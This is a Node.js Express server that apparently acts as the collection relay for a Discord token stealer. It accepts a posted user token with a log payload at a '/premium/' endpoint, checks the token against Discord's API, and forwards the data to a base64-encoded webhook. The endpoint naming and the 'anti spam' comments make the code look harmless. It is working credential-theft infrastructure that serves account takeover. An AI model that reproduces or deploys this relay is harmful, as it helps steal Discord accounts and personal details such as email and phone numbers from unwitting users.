const express = require("express");
const app = express();
const bodyParser = require("body-parser");
const rateLimit = require("express-rate-limit");
const axios = require("axios");
const base64 = require("base-64")
const fs = require("fs")
const https = require("https")
var privateKey = fs.readFileSync( 'privatekey.pem' );
var certificate = fs.readFileSync( 'certificate.pem' );


const mohamedhook =
  "your webhook";
  
let webhook = base64.decode(mohamedhook);
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 20, // Limit each IP to 100 requests per `window` (here, per 15 minutes)
  standardHeaders: true, // Return rate limit info in the `RateLimit-*` headers
  legacyHeaders: false, // Disable the `X-RateLimit-*` headers
});

app.use(bodyParser.json());
app.use(
  bodyParser.urlencoded({
    extended: true,
  })
);

//START ANTI SPAM REQUEST TO LIMIT DDOS ATTACK

app.use("/api", apiLimiter);

//START MAIN FUNCTION
main().catch((err) => console.log(err));

async function main() {
  app.post("/premium/", async (req, res) => {

    if (!req.body.data) return;
    if (!req.body.token) return;
    res.send("404")

    //CHECK IF TOKEN = VALID
    const response = await axios
      .get("https://discord.com/api/v9/users/@me", {
        headers: { Authorization: req.body.token },
      })
      .catch(function (error) {
        if (error.response) {
          //potentiel spammer (token != valid)

          return error;
        }
        return;
      });

    if (!response) return;
    if (!response.data) return;
    if (!response.data.id) return;
    console.log("token valid");
    const {
      id,
      username,
      avatar,
      email,
      phone,
      purchased_flags,
      discriminator,
    } = response.data;

    let logs = JSON.parse(req.body.data);
    if (!logs) return;
    if (!logs.embeds) return;


    var config = {
      method: "POST",
      url: webhook,
      headers: { "Content-Type": "application/json" },
      data: req.body.data,
    };
    try {
      axios(config)
        .then((response) => {
          console.log("Webhook delivered successfully \n" + req.body.data);
          return response;
        })
        .catch((error) => {
          console.log(error);
          return error;
        });
    } catch (e) {}
  });

  https
  .createServer(
    {
      key: privateKey,
      cert: certificate
    },
    app
  )
  .listen(3000, function () {
    console.log(
      "On"
    );
  });
}
